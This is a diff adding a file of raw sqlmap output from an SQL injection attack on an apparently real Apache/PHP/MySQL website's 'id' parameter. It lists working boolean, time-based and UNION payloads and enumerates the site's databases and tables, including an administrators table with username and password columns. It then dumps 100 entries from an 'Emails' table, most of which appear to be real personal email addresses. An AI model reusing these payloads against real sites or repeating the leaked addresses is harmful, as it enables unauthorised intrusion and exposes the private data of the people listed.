@@ -1,0 +1,284 @@
+sqlmap identified the following injection point(s) with a total of 79 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 6168=6168
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=2 UNION ALL SELECT CONCAT(0x717a627671,0x4e47526f445049776274744a7872636d614c4472476e76787674486c767068686c676d6b456b6658,0x7171767171),NULL,NULL,NULL-- cBCu
+---
+web application technology: Apache 2.4.34, PHP 7.0.31
+back-end DBMS: MySQL >= 5.0.12
+available databases [6]:
+[*] bible_glossary
+[*] bible_history
+[*] bratfactor
+[*] information_schema
+[*] rusty_ancient
+[*] rusty_even
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 6168=6168
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=2 UNION ALL SELECT CONCAT(0x717a627671,0x4e47526f445049776274744a7872636d614c4472476e76787674486c767068686c676d6b456b6658,0x7171767171),NULL,NULL,NULL-- cBCu
+---
+web application technology: Apache 2.4.34, PHP 7.0.31
+back-end DBMS: MySQL >= 5.0.12
+available databases [6]:
+[*] bible_glossary
+[*] bible_history
+[*] bratfactor
+[*] information_schema
+[*] rusty_ancient
+[*] rusty_even
+
+Database: bible_history
+[52 tables]
++-----------------------------+
+| Emails                      |
+| administrators              |
+| bh_addform                  |
+| bh_guestbook                |
+| bho_board_bans              |
+| bho_board_forums            |
+| bho_board_posts             |
+| bho_board_search            |
+| bho_board_topics            |
+| bho_board_users             |
+| bible_book                  |
+| books                       |
+| cat                         |
+| categories                  |
+| chapters                    |
+| chapters1                   |
+| commentary_jfb              |
+| eastons                     |
+| guestbook                   |
+| isbe                        |
+| kingjames                   |
+| kjv_verse                   |
+| links                       |
+| mathew                      |
+| naves                       |
+| naves_phrase                |
+| naves_verse                 |
+| ob_book_abbreviation_lookup |
+| outline_chapter             |
+| outline_major_section       |
+| questions                   |
+| series                      |
+| smiths                      |
+| smiths_ref                  |
+| sub                         |
+| subjects                    |
+| tbl_dictionary              |
+| tbl_fausset                 |
+| tbl_gfd                     |
+| tbl_hitchcock               |
+| tbl_hollman                 |
+| tbl_ibhcategory             |
+| tbl_ibhsubcategory          |
+| tbl_image                   |
+| tbl_isbe                    |
+| tbl_sdas                    |
+| tbl_the                     |
+| tbl_tt                      |
+| tbl_vcx                     |
+| user_links                  |
+| web_verse                   |
+| web_verse_bak               |
++-----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 6168=6168
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=2 UNION ALL SELECT CONCAT(0x717a627671,0x4e47526f445049776274744a7872636d614c4472476e76787674486c767068686c676d6b456b6658,0x7171767171),NULL,NULL,NULL-- cBCu
+---
+web application technology: Apache 2.4.34, PHP 7.0.31
+back-end DBMS: MySQL >= 5.0.12
+Database: bible_history
+Table: administrators
+[5 columns]
++------------------+-------------+
+| Column           | Type        |
++------------------+-------------+
+| admin_first_name | varchar(40) |
+| admin_id         | int(11)     |
+| admin_last_name  | varchar(40) |
+| admin_password   | varchar(8)  |
+| admin_username   | varchar(15) |
++------------------+-------------+
+
+Database: bible_history
+Table: Emails
+[5 columns]
++----------+-----------+
+| Column   | Type      |
++----------+-----------+
+| created  | timestamp |
+| email_id | text      |
+| id       | int(11)   |
+| randing  | int(11)   |
+| verified | int(11)   |
++----------+-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2 AND 6168=6168
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2 AND SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: id=2 UNION ALL SELECT CONCAT(0x717a627671,0x4e47526f445049776274744a7872636d614c4472476e76787674486c767068686c676d6b456b6658,0x7171767171),NULL,NULL,NULL-- cBCu
+---
+web application technology: Apache 2.4.34, PHP 7.0.31
+back-end DBMS: MySQL >= 5.0.12
+Database: bible_history
+Table: Emails
+[100 entries]
++------------------------------+-------+
+| email_id                     | id    |
++------------------------------+-------+
+| <blank>                      | 14672 |
+| tjstansell@bellsouth.att     | 14673 |
+| kegrubb@hotmail.com          | 14674 |
+| lenebug90945@gmail.com       | 14671 |
+| winter@example.com           | 14670 |
+| asdf1925                     | 14669 |
+| asdf6750                     | 14668 |
+| vega@example.com             | 14667 |
+| sample@email.tst             | 14666 |
+| cstegall08@gmail.com         | 14584 |
+| wandahickson@yahoo.com       | 14585 |
+| henryfonda@optusnt.com.au    | 14586 |
+| genesis27756@hotmail.com     | 14587 |
+| luis.j_rivera@yahoo.com      | 14588 |
+| timkyles93@gmail.com         | 14589 |
+| wfurnaris@aolc.om            | 14590 |
+| 111lobster111@gmail.com      | 14591 |
+| chinnooker@att.net           | 14592 |
+| peterstierjr@gmail.com       | 14593 |
+| bastlesl@gmail.com           | 14594 |
+| thershberger@caj.or.jp       | 14595 |
+| contep@tds.net               | 14596 |
+| kingsouha123@gmail.com       | 14597 |
+| tankokchai@gmail.com         | 14598 |
+| scottarath@msn.com           | 14599 |
+| akomax@hotmail.com           | 14600 |
+| mymail@gmail.com             | 14601 |
+| medram90@gmail.com           | 14602 |
+| koukou@hotmail.fr            | 14603 |
+| jeff.flint@activ8.net.au     | 14604 |
+| jasonnicholl75@gmail.com     | 14605 |
+| oneurima@yahoo.com           | 14606 |
+| Philndebby@gmail.com         | 14607 |
+| kubheka.xc@gmai.com          | 14608 |
+| josephraju.srinu@gmail.com   | 14609 |
+| bkiran.vkb@gmail.com         | 14610 |
+| peppercorn1@gmail.com        | 14611 |
+| ktiaeuktoiueaozt@hotmail.fr  | 14612 |
+| gkokali@aol.com              | 14613 |
+| sbhshsjjs@gnail.com          | 14614 |
+| nsanyatoyo@hotmail.com       | 14615 |
+| aeking@bell.net              | 14616 |
+| hlatt1@verizon.net           | 14617 |
+| livealonenever@yahoo.com     | 14618 |
+| selcukerkal2@gmail.com       | 14619 |
+| yaaawuah@yahoo.com           | 14620 |
+| johnnyestrada@me.com         | 14621 |
+| frandymc@yahoo.com           | 14622 |
+| cjsnaffles@yahoo.com         | 14623 |
+| dbrown@loyolahs.edu          | 14624 |
+| sharonarmke@gmail.com        | 14625 |
+| kimjk6404@hotmail.com        | 14626 |
+| kathy.merrill@principia.edu  | 14627 |
+| abdoukeb23@gmail.com         | 14628 |
+| peacemaker159@bellsouth.net  | 14629 |
+| mollyvwellman@hughes.net     | 14630 |
+| 9ball@teleclipse.net         | 13715 |
+| rosarioan16@yahoo.com        | 13812 |
+| LMOUMENSAID1@GMAIL.COM       | 13813 |
+| jhadley2468@gmail.com        | 13957 |
+| andre@ipib.org               | 13958 |
+| Blackard74@gmail.com         | 13959 |
+| arroyorios12@yahoo.com       | 13960 |
+| ckabelle@hotmail.com         | 13961 |
+| corley.rachael@yahoo.com     | 13962 |
+| wolstes@telkomsa.net         | 13963 |
+| hmreal@hotmail.com           | 13964 |
+| ntheyagaraj@gmail.com        | 13965 |
+| naseraddinhd@gmail.com       | 13966 |
+| djwynne_sills@yahoo.com      | 13967 |
+| dhfaerber@bigpond.com        | 13968 |
+| mbokisibilina@gmail.com      | 13969 |
+| stevenkarlhamer@yahoo.co.uk  | 13970 |
+| srkohh@gmail.com             | 13971 |
+| bwalyacharl@gmail.com        | 13972 |
+| ultradeion@outlook.com       | 13973 |
+| deonglweb@gmail.com          | 13974 |
+| godfavoritehouse@gmail.com   | 13975 |
+| sanderscynthia4098@yahoo.com | 13976 |
+| rubelsmail80@gmsil.com       | 13977 |
+| renzden@gmail.com            | 13978 |
+| dricana10@yahoo.com          | 13979 |
+| melv2008@gmail.com           | 13980 |
+| LILLIEGIN@CA.RR.COM          | 13981 |
+| reneemmartinez@gmail.com     | 13982 |
+| nafzi@hotmail.fr             | 13983 |
+| reneejohnson557@comcast.net  | 13984 |
+| meigsal328@gmail.com         | 13985 |
+| maurice2peter@gmail.com      | 14005 |
+| squirrelpatch@yahoo.com      | 14006 |
+| Chacokat27@yahoo.com         | 14007 |
+| chris.hanbury@gmail.com      | 14008 |
+| charles.arries@gmail.com     | 14009 |
+| roneu1946@hotmail.com        | 14010 |
+| pbobbt@aol.com               | 14011 |
+| mtruelove1967@icloud.com     | 14012 |
+| skinner.eve@gmail.com        | 14013 |
+| lgolfman@yahoo.ca            | 13814 |
+| overcomer40@hotmail.com      | 13815 |
+| ladypink0313@yahoo.com       | 13816 |
++------------------------------+-------+
+
+Database: bible_history
+Table: administrators
+[1 entry]
++----------+---------+
+| email_id | id      |
++----------+---------+
+| <blank>  | <blank> |
++----------+---------+
+
